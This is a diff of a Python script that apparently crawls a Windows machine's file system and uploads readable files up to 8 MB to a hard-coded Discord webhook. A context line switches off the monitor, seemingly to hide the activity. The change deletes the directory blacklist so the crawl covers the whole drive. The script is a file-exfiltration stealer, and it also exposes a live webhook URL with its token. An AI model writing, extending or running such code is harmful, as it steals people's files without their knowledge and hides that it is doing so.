@@ -11,8 +11,7 @@ ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
 
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1116644587738497074/xW4tlKgSbjoyUQBCWF3eiETbxNBTz7_t7UEOyqnuJ-1irTx3yyNArxdCJrtP3OCzuA9R"
-# Directories to ignore during file search
-BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']
+
 MAX_FILE_SIZE_MB = 8
 
 def check_file(file_path):
@@ -26,9 +25,6 @@ def check_file(file_path):
         return False
     # skip files requiring admin privileges
     elif os.path.isfile(file_path) and not os.access(file_path, os.R_OK):
-        return False
-    # skip files in blacklisted dir
-    elif any(blacklisted_dir in file_path for blacklisted_dir in BLACKLISTED_DIRS):
         return False
     else:
         return True
@@ -48,9 +44,6 @@ def upload_file(file_path):
 
 def search_files(root_dir):
     for root, dirs, files in os.walk(root_dir):
-        if any(blacklisted_dir in root for blacklisted_dir in BLACKLISTED_DIRS):
-            # Skip blacklisted directories
-            continue
         for file in files:
             file_path = os.path.join(root, file)
             if check_file(file_path):
